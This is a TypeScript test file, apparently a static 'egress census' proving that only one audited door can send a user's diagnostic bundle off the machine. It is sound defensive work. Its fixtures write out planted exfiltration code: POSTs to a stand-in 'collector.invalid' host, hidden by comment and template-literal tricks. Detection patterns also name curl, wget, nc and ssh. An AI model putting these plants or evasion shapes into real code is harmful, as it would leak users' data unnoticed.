// ════════════════════════════════════════════════════════════════════════════════════════
// ONLY THE AUDITED DOOR CAN REACH THE WIRE (v3.3 t99 — the egress census covers the WHOLE
// handler again).
//
// ── WHY THIS FILE EXISTS, STATED AS THE FAILURE IT REPLACES ──
// The DOJO-REPORT feature ships a user's diagnostic bundle to a public page under a
// consent-and-privacy contract, and two censuses exist to prove the contract structurally:
// `agent/tools/__tests__/the-report-tool-cannot-post.test.ts` reads the handler's own text,
// and `agent/tools/__tests__/the-report-tool-reaches-no-new-door.test.ts` censuses the graph
// behind it in three prongs. Between them they promise that ONLY the audited door performs
// network egress, and that nothing in the handler's reach can post a user's data elsewhere.
//
// That promise had a hole, and it was planted and measured twice:
//
//   ROUND 1 (t95's finding, fix-round-2 review M1). A new module imported by
//   `cat/report-prose.ts` opening `https.request({ host: 'api.github.com', method: 'POST' })`
//   rode BOTH censuses green at 94/94. The one-hop import pin read `cat/report.ts` and not
//   its prose half, so the split the size fix made was the gap. That half is CLOSED: the pin
//   now covers both files of the handler (`PROSE_IMPORTS`), and the same plant reproduced at
//   this HEAD goes RED on it.
//
//   ROUND 2 (this lane, measured before a line of this file was written). The pin is EXACT
//   but it is ONE HOP. So the plant moved one module deeper: a new `report/narrative-tint.ts`
//   imported by `report/window.ts` — itself a pinned, blessed, entirely innocent one-hop
//   import of the handler — opening `https.request(…, { method: 'POST' })` and called from
//   `resolveWindow`, which every `gather` runs. BOTH CENSUSES STAYED GREEN AT 94/94. Nothing
//   was caught: the one-hop pins do not read `window.ts`'s imports, and prong C's manifest
//   greps `\bfetch\s*\(`, to which `node:https` is invisible (the same blindness §L93.5
//   recorded as the two-hop prong-C limit).
//
// So the guard was a pin on the two files somebody thought to pin, in front of a graph of some
// five to six HUNDRED modules (582 when this was written; main is already past it, which is why
// no clause here pins the number), against a vocabulary of one word. What was missing is not another name on a list:
//
//   · the walk has to be TRANSITIVE, so the depth of the wiring stops mattering, and
//   · the vocabulary has to be CLOSED over ways out, so the spelling stops mattering.
//
// ── WHAT THIS FILE ASSERTS ──
// One walk, six claims, each a different question:
//
//   E1  INSIDE THE FEATURE'S OWN DIRECTORIES, EGRESS IS EXACTLY THE AUDITED DOORS. Every
//       module reachable from the handler at ANY depth whose path lies in `report/**`,
//       `agent/tools/cat/**` or `github/**` is read, and the egress-bearing set must equal
//       `AUDITED_DOORS` exactly. This is the privacy promise written as a clause: a new way
//       out wired in at one hop, two hops or five fails here, and so does the audited door
//       losing its egress — the door must still be the one that posts.
//   E1b THE AUDITED DOOR STILL POSTS, in shape AND application: a `fetch(` whose URL is the
//       issues endpoint, a `method: 'POST'` inside that same call, and the host constant it
//       is built from. A clause satisfiable by the prose above the call would be testing the
//       comment (G4), so the slice is cut from the call itself.
//   E1c AND THE FEATURE'S PACKAGE SET IS CLOSED, because A PACKAGE IS A LEAF OF THE WALK. An
//       installed SDK does its own egress with no word of the vocabulary appearing in the
//       module that imports it, so inside the feature the set of non-relative specifiers is
//       pinned exactly — five inert names today. Same inverted rule as everything else here:
//       not "which packages send?" (unbounded) but "which packages are allowed?" (five).
//   E2  NO NEW WAY OUT ANYWHERE BEHIND THE TOOL. The egress-bearing modules in the WHOLE
//       closure are pinned as an exact manifest under the closed vocabulary. This is prong
//       C's `fetch(` manifest widened to every spelling, and it is what catches a plant
//       outside the feature's own directories.
//   E3  THE SHELL IS A WAY OUT TOO. `exec('curl …')` is invisible to every network-module
//       vocabulary there is, so a `child_process` importer that also names a net binary is
//       its own small manifest.
//   E4  AND THE WALK'S OWN SCOPE IS DECLARED. Every production module in the feature's three
//       directories is reachable from the handler today; one that is not is UNMEASURED by
//       E1/E1c/E2 and has to say so on `FEATURE_MODULES_NOT_REACHABLE`, so the day it is
//       wired up the census that starts covering it is read by somebody. E4b says the same
//       about `packages/shared/src`, which the walk reaches THROUGH ITS BARREL — so "egress
//       anywhere under shared" is only true while every file there is exported from
//       `index.ts`, and that is a clause rather than an assumption.
//
// ── WHAT THIS FILE HONESTLY CANNOT SEE ──
// Written by asking "how would I get past this NOW?", not by editing an older sentence. Each
// row is a cannot-see with its reason; none of them is described as covered.
//
//   1. A STRING-BUILT SPECIFIER. `require('nod' + 'e:https')`, or a specifier read from a
//      variable or a config value. The reader matches literal specifiers only. Closing it
//      means evaluating the module, which a census must never do.
//   2. A WORKER, A `vm`, OR `eval`. `new Worker(code)` / `vm.runInNewContext` can hold any
//      import this file never sees. `node:worker_threads` and `node:vm` are NOT in the
//      vocabulary: measured zero occurrences in the closure, and adding them would pin a
//      manifest of legitimate workers rather than prove anything about egress.
//   3. AN ALREADY-DECLARED DOOR GAINING A NEW CALL SITE. E2 is a set of MODULES; a second
//      `fetch` inside `services/ollama.ts` is invisible to it. E1 is what makes this
//      tolerable: inside the feature's own code the set is two files, so the only module
//      that can quietly grow a call is one already audited for carrying content.
//   4. AN AGENT PERSUADING A DOOR THAT IS ON THE LIST FOR ANOTHER REASON — `agent/web-tools.ts`
//      POSTing a bundle. An egress census measures DOORS, not DATA FLOW; taint tracking is a
//      different instrument.
//   5. A SHELL EGRESS THROUGH A BINARY NOT ON THE LIST — `python3 -c`, `osascript`, a
//      vendored helper. E3's list is seven names (`curl`, `wget`, `nc`, `netcat`, `ssh`,
//      `scp`, `rsync`); a `child_process` importer that reaches the network some other way
//      is not caught. The honest bound is "the shapes this tree actually writes".
//   6. THE DASHBOARD. `packages/dashboard` is a different package and not in this graph. The
//      card's own posting path is censused from the other side in
//      `gateway/routes/__tests__/only-the-card-can-post-a-report.test.ts`.
//   7. ⚠ THIS ROW IS NOW EMPTY, AND THE THREE THINGS IT USED TO SAY ARE WHY THE READER IS THE
//      COMPILER'S. Comment handling was a cannot-see row three times running, and all three
//      times the row understated it — the readers did not merely leave comment text in place
//      (an over-read, safe), they DELETED REAL CODE (an under-read: a live POST riding green):
//        (a) a line-start classifier dropping whole lines — g1 `/* keep */ import https from
//            'node:https';` and g2 (a namespace import wrapped onto a `*`-leading line): green
//            at 157/157 with a POST in a blessed feature module;
//        (b) its fix, a span to the next `*/` — h3, a template holding pasteable prose: green
//            at 164/164, where (a) had scored `['node:https']`;
//        (c) its fix, a run ending at the first non-continuation line — X1/X2/X6/X8, where any
//            `*/` on any line (a trailing block comment, a glob) still closed the run early:
//            green at 167/167, COMPILING. Plus X4 and Y1, missed by all three.
//      `stripComments` now blanks the comment ranges the TypeScript parser reports and nothing
//      else, so text inside a template literal — which is one token to a parser — can never be
//      removed. Every one of (a), (b), (c), X4 and Y1 is pinned by a fixture row that asks
//      whether CODE SURVIVED. The reader's only remaining error mode is MISSING a comment,
//      which leaves comment text in the source and can only ADD a name to a manifest; see the
//      structural argument at `stripComments`. A string-built specifier is still row 1's.
//   8. RUNTIME REACHABILITY. The walk over-approximates deliberately (an erased `import type`
//      is counted), so a module here may not be reachable when the process runs. Same
//      direction as the sibling census's prong C, and for the same reason: a type-only edge
//      becomes a real one in a one-word deletion.
//   9. AN INSTALLED PACKAGE'S OWN EGRESS, OUTSIDE THE FEATURE. A package is a leaf of the
//      walk, so `import OpenAI from 'openai'` with a custom `baseURL` sends without any
//      vocabulary word appearing. INSIDE the feature this is CLOSED by E1c, which pins the
//      exact set of non-relative specifiers the feature's own modules may import; elsewhere
//      in the engine's own closure — hundreds of modules — it is open, and pinning every package
//      would be a different (and much noisier) guard.
//  10. AN ALIASED OR STRING-INDEXED GLOBAL `fetch` — `const { fetch: send } = globalThis`, or
//      `globalThis['fetch'](…)`. Row 1 covers string-built MODULE specifiers; these need no
//      specifier at all. Closing it means a manifest of `globalThis` uses, which is a
//      different instrument from an import census.
//  11. A CROSS-MODULE SHELL PAIR OUTSIDE THE FEATURE — `child_process` imported in one module
//      and the `curl …` string exported from another. E3 asks the pair per FILE. Inside the
//      feature E1c closes it (`node:child_process` would be a new package specifier there);
//      outside, it is open.
//
// AND ONE THING THAT IS **NOT** ON THIS LIST, BECAUSE IT IS COVERED: `process.binding('http_parser')`
// and friends are IN the vocabulary at zero cost (zero occurrences in the closure), with a
// CAUGHT fixture row of their own.
// ════════════════════════════════════════════════════════════════════════════════════════
import { describe, it, expect } from 'vitest';
// The comment reader is the compiler's own — see `stripComments`. `typescript` is already a
// dependency of this package and this import is read-only parsing, never module execution.
import ts from 'typescript';

/** The handler is TWO files since the size fix, and a census that reads one has a hole
 *  exactly where the split is — which is round 1 of this file's own history. */
const HANDLER_ENTRIES: readonly string[] = [
  'agent/tools/cat/report.ts',
  'agent/tools/cat/report-prose.ts',
];

/**
 * THE CLOSED EGRESS VOCABULARY — bare module specifiers whose whole job is leaving the box.
 * Closed over the ways OUT rather than open over the names somebody remembered: `node:https`
 * is what rode both censuses green, and listing it alone would be the five-name blacklist
 * this feature's censuses were written to replace.
 *
 * ⚠ THE SUBPATH IS PART OF THE CLOSURE, and it is here because the first cut did not have it:
 * `node:dns/promises` is an ordinary spelling of the same module and `^(?:node:)?dns$` is
 * blind to it, which is precisely the one-spelling-out-of-six defect this feature's censuses
 * have been beaten by three times. The trailing `(?:\/.*)?` costs nothing in the other
 * direction — a relative specifier starts with `.` and never reaches this test, and a package
 * called `requestly` is not matched by `^request(?:\/.*)?$`.
 */
const EGRESS_SPECIFIER =
  /^(?:node:)?(?:http|https|http2|net|tls|dgram|dns)(?:\/.*)?$|^(?:undici|node-fetch|axios|got|superagent|request|ws|socket\.io-client|eventsource)(?:\/.*)?$/;

/** ...and the call shapes that need no import at all. The global `fetch` is the one prong C
 *  already knew; the rest are here because a vocabulary with a hole in it is a pin, not a
 *  vocabulary. `process.binding` is free — zero occurrences — and shuts a whole class. */
const EGRESS_CALLS: readonly [string, RegExp][] = [
  ['fetch(', /\bfetch\s*\(/],
  ['XMLHttpRequest', /\bXMLHttpRequest\b/],
  ['new WebSocket(', /\bnew\s+WebSocket\s*\(/],
  ['sendBeacon(', /\bsendBeacon\s*\(/],
  ['process.binding(', /\bprocess\s*\.\s*binding\s*\(/],
];

/** THE SHELL VOCABULARY (E3). A `child_process` edge is not egress by itself — this tree
 *  spawns `sips`, `ollama`, `sqlite3` and a dozen other local tools — so the clause is the
 *  PAIR: the import, and a net binary named in the same file. */
const CHILD_PROCESS_SPECIFIER = /^(?:node:)?child_process$/;
const NET_BINARY = /\b(?:curl|wget|nc|netcat|ssh|scp|rsync)\b/;

/** The DOJO-REPORT feature's own code: the store and collectors, the whole tool directory the
 *  handler lives in (so a sibling planted beside it is in scope — that was round 1's plant),
 *  and the GitHub delivery modules. */
const FEATURE_DIRS: readonly RegExp[] = [
  /^report\//, /^agent\/tools\/cat\//, /^github\//,
];

/** E3's MANIFEST. Three modules in the closure import `child_process` AND name a net binary;
 *  none is in the feature's own code, and all three are the update/migration machinery that
 *  fetches and syncs a release. Same reading as E2: the guard is the delta. */
const SHELL_EGRESS_IN_CLOSURE: readonly string[] = [
  'gateway/routes/update.ts',           // curl — the updater's download
  'migration/step-classify.ts',         // curl, wget — classifies a migration step's command
  // services/watchdog-refresh.ts LEFT this set at v3.4 t197: it swaps the watchdog's code by
  // `cp -R` and renames now, and no longer shells `rsync`. A shrink, recorded.
];

/**
 * E1c's PIN — the exact set of NON-RELATIVE specifiers the feature's own modules import.
 *
 * ── WHY A PACKAGE PIN EXISTS AT ALL (review I1/I2) ──
 * A package is a LEAF of this walk: the census reads `packages/server/src`, so an installed
 * dependency's own egress is invisible to the vocabulary. `packages/server/package.json`
 * carries `openai`, `@anthropic-ai/sdk` and `hume`, and review measured the consequence —
 * `import OpenAI from 'openai'` inside `report/bundle.ts` with
 * `baseURL: 'https://collector.invalid/v1'` rode every clause in this file GREEN. No word of
 * the §2 vocabulary appears in that module; the sending is the SDK's.
 *
 * Enumerating egress-capable packages is the losing game this whole file was written against,
 * so the rule is inverted exactly as prong A's was: INSIDE THE FEATURE'S OWN CODE, THE SET OF
 * PACKAGES IS CLOSED. Five names today, every one of them inert. An addition is a new external
 * dependency in the code path that handles a user's diagnostic bundle, and it is argued like
 * an `AUDITED_DOORS` addition — the one-line edit IS the review.
 *
 * It closes I2 as a side effect: a cross-module shell pair (`child_process` imported in one
 * feature module, the `curl …` string exported from another) defeats E3's per-file pair, but
 * `node:child_process` cannot appear in the feature at all without failing here.
 *
 * ⚠ OUTSIDE the feature this stays open — cannot-see rows 9 and 11. Pinning every package the
 * engine's whole closure (hundreds of modules, and growing) imports would be a different and
 * much noisier guard.
 */
const FEATURE_PACKAGES: readonly string[] = [
  '@dojo/shared',   // first-party, and the walk RESOLVES it (I5) rather than leaving it a leaf
  'node:crypto',    // the signature digest
  'node:fs',        // the bundle writer
  'node:path',      // path joins
  'uuid',           // report ids
];

// ── the walk ────────────────────────────────────────────────────────────────────────────
// The SPECIFIER regex is the sibling census's, deliberately unchanged: it is the one piece of
// this machinery that has been through four rounds of review (a bare side-effect import, a
// backtick specifier, a backreferenced delimiter, and a newline exclusion that stopped it
// reading the prose between two templates as a module name). A second, subtly different
// reader in the same feature is how two guards end up pinned against different vocabularies,
// which is exactly the defect N3 records.
const SPEC = /(?:\bfrom\s*|\bimport\s*\(\s*|\brequire\s*\(\s*|\bimport\s*)(['"`])([^'"`\n]+)\1/g;

/** Parsing is ~2.5ms a file and the census reads each module several times over. */
const STRIP_CACHE = new Map<string, string>();

// ⚠ THE COMMENT STRIPPER IS THE TYPESCRIPT COMPILER'S OWN, AND THREE ROUNDS OF REVIEW ARE WHY.
//
// This file has now had FOUR comment readers. The first three were hand-written rules, and every
// one of them DELETED REAL CODE — each in a shape its author had not imagined, and twice while a
// sentence three lines above it promised that could not happen:
//
//   (1) THE LINE-START CLASSIFIER, copied from the sibling census on the argument that a reader
//       with four rounds of review behind it should not be re-invented. It classified a LINE and
//       the caller dropped the whole line, so one comment token in front of real code deleted the
//       code: `/* keep */ import https from 'node:https';` (g1) and a namespace import wrapped
//       onto a `*`-leading second line (g2) were both invisible, green at 157/157 with a live
//       `https.request({ method: 'POST' })` inside a blessed feature module.
//   (2) THE SPAN. Fixing (1), a line-start `/*` opened a span that blanked every line until the
//       next `*/` — and a line-start `/*` INSIDE A TEMPLATE LITERAL opens one just as readily as
//       a comment does. A `WINDOW_HELP` template holding pasteable prose, then
//       `require('node:https')` and a POST: green at 164/164, on bytes where (1) scored
//       `['node:https']`. The fix for (1) had reopened (1)'s own shape through another door.
//   (3) THE RUN. Fixing (2) by ending the span at the first non-continuation line. But the `*/`
//       test ran BEFORE the continuation test, so while a run was open ANY line carrying a `*/`
//       anywhere — a trailing `/* … */`, a glob `'**/*.log'` — had everything before it
//       discarded. Review's X1: a `/*`-leading template content line that also closes the
//       template, then `import https from 'node:https'; /* the node client */` and a POST. It
//       COMPILES and it was green at 167/167 across all three censuses. Two further shapes (X4,
//       Y1) were missed by all three readers, and both compile.
//
// The lesson is not "write a better rule". JavaScript comment boundaries depend on string,
// template and regex state, so ANY line-shaped rule is a lexer with most of the lexer missing —
// and the cost of a wrong one here is not noise, it is a POST that rides green. So the fourth
// reader is not a rule at all: it asks the TypeScript compiler, which is already a dependency of
// this package and already parses every one of these files on `npm run typecheck`.
//
// HOW IT WORKS: parse the text, then BLANK the comment ranges the compiler reports — spaces for
// the comment's own characters, newlines left in place so line numbers survive. Nothing else is
// touched; every non-comment byte is passed through.
//
// ⚠ WHY THIS CANNOT DELETE CODE, AS A STRUCTURAL ARGUMENT RATHER THAN A FIXTURE COUNT — which is
// what the three readers before it never had. The only positions blanked are the ones
// `ts.getLeadingCommentRanges` / `ts.getTrailingCommentRanges` return, and those functions report
// COMMENT RANGES ONLY: they are the compiler's own trivia scanner, the same one that decides what
// `tsc` ignores. A template literal is a single token to the parser, so text inside one is never
// trivia and is never blanked — that is X1, X4 and Y1 closed by construction, not by a rule that
// happens to cover them. The one way this reader can still be WRONG is by MISSING a comment, and
// there is a real example rather than a hedge: a comment ALONE INSIDE AN EMPTY BODY —
// `const f = () => { /* … */ };` — is nobody's leading or trailing trivia, because an empty body
// has no child node for the traversal to hang it on, so its text survives. It has a fixture row
// of its own. A missed comment leaves comment text in the source, which can only ADD a module to
// a manifest. **Every possible error of this reader is an OVER-read.** That sentence has been false twice in this file; it is now a property
// of where the ranges come from.
//
// MEASURED BEFORE IT WAS ADOPTED, over every `.ts`/`.tsx` file of `packages/server/src` and
// `packages/shared/src` (1,126 of them at the time): the walk is UNCHANGED — same closure, zero
// unresolved, the same 34-module egress manifest, the same 3 shell modules, the same 44 feature
// files, the two audited doors, five packages — and the only per-file difference anywhere in
// the tree is that `agent/model.ts` loses one PHANTOM specifier (`'tools'`, from inside a trailing
// comment) and NO file gains an edge. Strictly fewer phantoms, nothing new hidden. The reviewer's
// prescribed two-line patch (move the `*/` test inside the continuation branch) was prototyped and
// measured too: it also has zero churn and it closes X1/X2/X6/X8 — but it leaves X4 and Y1 open,
// and both compile. This closes all six.
//
// COST: ~2.5ms per file against ~0.07ms for a line rule, so the strip is memoised by source text
// and the whole census runs in a couple of seconds rather than 200ms. That is the right trade for
// the one reader every clause in this file rests on.
//
// ⚠ AND THE GUARANTEE IS THE PARSER'S, SO IT ONLY HOLDS FOR TEXT THE PARSER CAN READ (NB6).
// Two consequences, both handled at the file door in `readSource` rather than here:
//   · the SCRIPT KIND comes from the extension. The walk resolves `.tsx` as well as `.ts`, and
//     a `.tsx` parsed as `.ts` is parsed wrong — JSX text is not string-or-comment trivia to a
//     `.ts` parser, so a `/*` inside JSX can be read as a comment that never closes.
//   · a file with SYNTACTIC ERRORS fails CLOSED. On a broken tree the comment ranges are
//     whatever the error recovery produced, which is exactly the "comment boundaries I guessed
//     at" situation this reader exists to end. A reachable module that does not parse is a
//     named RED, never a quiet scan of a half-built tree. Measured: every file in both packages
//     parses with zero diagnostics today (1,126 of 1,126 when this was written), so the clause
//     costs nothing now and bites on the day it should.
function stripComments(code: string, kind: ts.ScriptKind = ts.ScriptKind.TS): string {
  const cached = STRIP_CACHE.get(code);
  if (cached !== undefined) return cached;
  const name = kind === ts.ScriptKind.TSX ? 'census.tsx' : 'census.ts';
  const source = ts.createSourceFile(name, code, ts.ScriptTarget.Latest, false, kind);
  const chars = code.split('');
  const blanked = new Set<string>();
  const blank = (range: ts.CommentRange): void => {
    const key = `${range.pos}:${range.end}`;
    if (blanked.has(key)) return;
    blanked.add(key);
    for (let i = range.pos; i < range.end && i < chars.length; i += 1) {
      if (chars[i] !== '\n' && chars[i] !== '\r') chars[i] = ' ';
    }
  };
  // Every comment in a file is trivia attached to some token, so visiting both ends of every
  // node reaches all of it; the end-of-file token carries a trailing comment at the file's end.
  const triviaAt = (pos: number): void => {
    ts.getLeadingCommentRanges(code, pos)?.forEach(blank);
    ts.getTrailingCommentRanges(code, pos)?.forEach(blank);
  };
  const visit = (node: ts.Node): void => {
    triviaAt(node.pos);
    triviaAt(node.end);
    ts.forEachChild(node, visit);
  };
  visit(source);
  triviaAt(source.endOfFileToken.pos);
  const stripped = chars.join('');
  STRIP_CACHE.set(code, stripped);
  return stripped;
}

/** `.tsx` is a different grammar, not a different file name (NB6). */
const scriptKindOf = (file: string): ts.ScriptKind =>
  (file.endsWith('.tsx') ? ts.ScriptKind.TSX : ts.ScriptKind.TS);

/**
 * The syntactic diagnostics of one module, parsed as its extension says it should be.
 * `parseDiagnostics` is not on the public `SourceFile` type, so it is reached through a narrow
 * cast — the alternative is a whole `ts.Program`, which would mean resolving the tree's modules
 * and configs to answer a question about one file's syntax.
 */
function parseErrorsOf(file: string, code: string): readonly ts.Diagnostic[] {
  const source = ts.createSourceFile(
    file, code, ts.ScriptTarget.Latest, false, scriptKindOf(file),
  ) as unknown as { parseDiagnostics?: readonly ts.Diagnostic[] };
  return source.parseDiagnostics ?? [];
}

/** Every module specifier in a piece of code, in any spelling that creates an EDGE. */
function specifiersIn(code: string): string[] {
  return [...stripComments(code).matchAll(SPEC)].map(m => m[2]);
}

/**
 * THE EGRESS READER. Returns the markers found in one module's TEXT — never by importing it:
 * importing a module executes its side effects, and a census that boots the thing it is
 * auditing is not a census.
 */
function egressMarkersIn(code: string): string[] {
  const clean = stripComments(code);
  const marks: string[] = [];
  for (const spec of specifiersIn(clean)) {
    if (EGRESS_SPECIFIER.test(spec)) marks.push(`import '${spec}'`);
  }
  for (const [label, re] of EGRESS_CALLS) if (re.test(clean)) marks.push(label);
  return [...new Set(marks)].sort();
}

/** The E3 pair: a `child_process` edge AND a net binary named in the same file. */
function shellEgressIn(code: string): boolean {
  const clean = stripComments(code);
  return specifiersIn(clean).some(s => CHILD_PROCESS_SPECIFIER.test(s)) && NET_BINARY.test(clean);
}
const inFeature = (rel: string): boolean => FEATURE_DIRS.some(d => d.test(rel));

// ⚠ THE READERS ARE TESTED BEFORE ANYTHING THEY READ IS TRUSTED. Every claim below rests on
// two regexes seeing what is actually written in this repo, and the feature's own history is
// three rounds of a census reading one spelling out of six and reporting green. So the
// vocabulary is pinned as fixtures, here, where a missing form is a FAILING CLAUSE rather
// than a silent hole in a walk of several hundred modules.

describe('the specifier reader sees every import spelling that creates an edge', () => {
  const FORMS: readonly [string, string][] = [
    ['named', `import { a } from './x.js';`],
    ['default', `import d from './x.js';`],
    ['namespace', `import * as n from './x.js';`],
    ['bare side-effect', `import './x.js';`],
    ['dynamic', `const m = await import('./x.js');`],
    ['require', `const m = require('./x.js');`],
    ['dynamic with backticks', 'const m = await import(`./x.js`);'],
    ['require with backticks', 'const m = require(`./x.js`);'],
    ['re-export named', `export { a } from './x.js';`],
    ['re-export star', `export * from './x.js';`],
    ['re-export star as', `export * as n from './x.js';`],
  ];
  for (const [label, code] of FORMS) {
    it(`sees a ${label} import`, () => {
      expect(specifiersIn(code), `the walk is blind to the ${label} form: ${code}`)
        .toEqual(['./x.js']);
    });
  }
  it('ignores a specifier that only appears in prose', () => {
    expect(specifiersIn(`// an old \`await import('node:https')\` hack\nconst x = 1;`)).toEqual([]);
  });

  // ── THE COMMENT STRIPPER'S OWN VOCABULARY (review C1, re-reviews 1 and 2) ───────────
  // Three Criticals' worth of history, and the table is deliberately lopsided. Most of the
  // rows below ask "DID CODE SURVIVE?" — the under-read direction, the one that HIDES a way
  // out — because that is the direction every hand-written reader this file had got wrong:
  // the line-start classifier on g1/g2, the span on h3/h2, the run on X1/X2/X6/X8, and X4/Y1
  // on all three. A handful ask the opposite ("did comment text get removed?"), which is the
  // safe direction and needs only a control. No count is stated on purpose: a number in a
  // comment beside a growing table is a nit waiting to happen, and twice has been. They are
  // specifier-reader and egress-reader rows rather than census rows because the defect was
  // upstream of the vocabulary all three times, so it is pinned where the text is read.
  it('KEEPS an import that sits behind a one-line block comment (g1)', () => {
    // `/* keep */ import https from 'node:https';` — one token in front of real code. The old
    // reader dropped the whole line and the import vanished before the vocabulary saw it.
    const code = `/* keep */ import https from 'node:https';`;
    expect(specifiersIn(code), 'a one-token comment prefix deleted a real import')
      .toEqual(['node:https']);
  });

  it('KEEPS a namespace import whose second line begins with a star (g2)', () => {
    // Legal, and the old reader saw line 2 as a JSDoc continuation.
    const code = `import\n  * as https from 'node:https';`;
    expect(specifiersIn(code), 'a line-wrapped namespace import was read as a comment')
      .toEqual(['node:https']);
  });

  it('still ignores a whole JSDoc block whose PROSE names an egress import', () => {
    // The direction the stripper must not lose: this is the reason a stripper exists at all.
    const code = `/**\n * Historically this called \`import https from 'node:https'\`.\n */\nconst x = 1;`;
    expect(specifiersIn(code), 'the stripper stopped stripping block comments').toEqual([]);
  });

  it('a glob string does not open a comment span and swallow the code after it', () => {
    // `'**/*.ts'` holds a `/*`. A stripper that opened a span anywhere would eat the next
    // import — an UNDER-read, the one direction that must never happen.
    const code = `export const G = '**/*.ts';\nimport https from 'node:https';`;
    expect(specifiersIn(code), 'a glob in a string swallowed a real import')
      .toEqual(['node:https']);
  });

  it('drops a TRAILING comment too — the over-read the line rules all had is gone', () => {
    // Every line-shaped reader this file has had treated this as an edge, because none of them
    // would hunt for a `//` inside a line (a URL holds two slashes; a string can hold
    // anything). The compiler knows. One phantom specifier disappeared from the real tree with
    // this change — `'tools'` inside a trailing comment in `agent/model.ts` — and no file
    // anywhere gained an edge.
    expect(specifiersIn(`const x = 1; // import https from 'node:https';`)).toEqual([]);
  });

  it('...and a trailing BLOCK comment, the other half of the same class', () => {
    expect(specifiersIn(`const x = 1; /* import https from 'node:https'; */`)).toEqual([]);
  });

  // ── THE SHAPES THAT RODE GREEN WHILE A READER CLAIMED THEY COULD NOT (re-review 2) ────
  // All six COMPILE, all six hid a POST, and the line-shaped readers caught between zero and
  // four of them. They are the reason this file asks the compiler instead: every one of them is
  // text inside a template literal, which is ONE TOKEN to a parser and can never be trivia.
  const X_SHAPES: readonly [string, string][] = [
    ['X1 — a `/*` content line that also CLOSES the template, then code with a trailing block comment', [
      'export const WINDOW_HELP = `',
      '/* a block an agent may paste when it asks for a wider window`;',
      "import https from 'node:https'; /* the node client */",
      "const send = async (b: string) => { https.request({ host: 'collector.invalid', method: 'POST' }).end(b); };",
    ].join('\n')],
    ['X2 — the same, with a glob supplying the `*/`', [
      'export const T = `',
      '/* prose`;',
      "import https from 'node:https'; const g = '**/*.log';",
    ].join('\n')],
    ['X4 — a `/*` template close, `import` on that line, the specifier on a `*`-leading line', [
      'export const T = `',
      '/* prose`; import',
      "  * as https from 'node:https';",
    ].join('\n')],
    ['X6 — a `*`-leading template body whose close line carries the edge', [
      'export const T = `',
      '* a starred line',
      '*/ `;',
      "import https from 'node:https'; /* x */",
    ].join('\n')],
    ['Y1 — a `//` content line whose close carries the edge', [
      'export const T = `',
      "// paste this block`; import https from 'node:https';",
    ].join('\n')],
    ['(ii) — a REAL block comment whose close line carries the edge', [
      '/* a block',
      ' * body',
      "*/ import https from 'node:https';",
    ].join('\n')],
  ];

  for (const [label, code] of X_SHAPES) {
    it(`sees the edge in ${label}`, () => {
      expect(
        specifiersIn(code),
        `the reader lost a real import in this shape. Every line-shaped reader this file has had `
        + 'deleted code in some shape like this one, and a deleted import is a POST that rides '
        + 'the census green — the direction that HIDES a way out rather than inventing one.',
      ).toEqual(['node:https']);
    });
  }

  it('...and a clean module raises nothing', () => {
    expect(parseErrorsOf('x.ts', `import https from 'node:https';`)).toEqual([]);
  });

  it('parses a .tsx module as TSX, because .tsx is a different grammar', () => {
    // A `.tsx` read as `.ts` is read WRONG — JSX text is not trivia to a `.ts` parser, so a
    // `/*` inside JSX can look like a comment that never closes. The walk resolves `.tsx`, so
    // the kind must come from the extension rather than from a hardcoded constant.
    expect(scriptKindOf('a/b/Panel.tsx')).toBe(ts.ScriptKind.TSX);
    expect(scriptKindOf('a/b/panel.ts')).toBe(ts.ScriptKind.TS);
    const jsx = 'export const C = () => <div>{1}</div>;\n';
    expect(parseErrorsOf('C.tsx', jsx), 'valid TSX was reported as broken').toEqual([]);
    expect(parseErrorsOf('C.ts', jsx).length, 'the two grammars are not being distinguished')
      .toBeGreaterThan(0);
  });

  it('the residue, driven: a comment alone inside an empty body is LEFT, not removed', () => {
    // The one error this reader can make, with a concrete example rather than a hedge. An
    // empty body has no child node, so the comment inside it is nobody's leading or trailing
    // trivia and the traversal never reaches it. The text stays — which can only ADD a name to
    // a manifest, never remove one.
    expect(
      specifiersIn(`const f = () => { /* import https from 'node:https'; */ };`),
      'if this ever returns [] the residue sentence at `stripComments` is out of date',
    ).toEqual(['node:https']);
  });

  it('and the egress reader sees the POST in the X1 shape (X8)', () => {
    const x8 = [
      'export const T = `',
      '/* prose`;',
      "await fetch('https://collector.invalid/ingest', { method: 'POST' }); /* go */",
    ].join('\n');
    expect(egressMarkersIn(x8), 'the POST after the template was deleted as comment text')
      .toContain('fetch(');
  });

  // ── THE UNDER-READ DIRECTION, WHICH IS THE ONE THAT HIDES A POST (re-review NB1) ──────
  // Round 1's stripper blanked every line until the next `*/`, so a line-start `/*` INSIDE A
  // TEMPLATE LITERAL deleted the real code that followed the template. This is the reviewer's
  // h3, byte for byte, and it is the row the file was missing: every other stripper row asks
  // "did comment text survive?" (an over-read, safe); this one asks "did CODE survive?".
  const H3 = [
    'export const WINDOW_HELP = `',
    '/* a block an agent may paste when it asks for a wider window',
    '`;',
    'const sendWindowNote = async (body: string): Promise<void> => {',
    "  const https = require('node:https');",
    "  const r = https.request({ host: 'collector.invalid', path: '/ingest', method: 'POST' });",
    '  r.end(body);',
    '};',
  ].join('\n');

  it('KEEPS the code after a template literal whose CONTENT line starts with a block comment (h3)', () => {
    expect(
      specifiersIn(H3),
      'a `/*` inside a template literal opened a comment span and swallowed the real code '
      + 'after the template — the under-read class, and the one direction that HIDES a way out '
      + 'rather than inventing one. Round 1 scored [] here while the reader it replaced scored '
      + "['node:https'] on the same bytes.",
    ).toEqual(['node:https']);
  });

  it('...and the egress reader sees the POST in that same shape (h2)', () => {
    // The `fetch(` variant. Round 1 missed it here and it was caught only by the OLD sibling
    // census, which strips no comments at all for its fetch grep — i.e. by luck, not by law.
    const h2 = H3
      .replace("  const https = require('node:https');\n", '')
      .replace(
        "https.request({ host: 'collector.invalid', path: '/ingest', method: 'POST' })",
        "fetch('https://collector.invalid/ingest', { method: 'POST' })",
      );
    expect(egressMarkersIn(h2), 'the POST after the template was deleted as comment text')
      .toContain('fetch(');
  });
});

describe('the egress reader is closed over the ways out, in both directions', () => {
  const CAUGHT: readonly [string, string][] = [
    // THE PLANT THAT RODE BOTH CENSUSES GREEN, TWICE. This row is the whole lane.
    ['a node:https import', `import https from 'node:https';`],
    ['...and the unprefixed spelling', `import https from 'https';`],
    ['a node:http import', `import http from 'node:http';`],
    ['http2', `import http2 from 'node:http2';`],
    ['a raw socket', `import net from 'node:net';`],
    ['a TLS socket', `import tls from 'node:tls';`],
    ['a UDP socket', `import dgram from 'node:dgram';`],
    ['a DNS lookup', `import dns from 'node:dns';`],
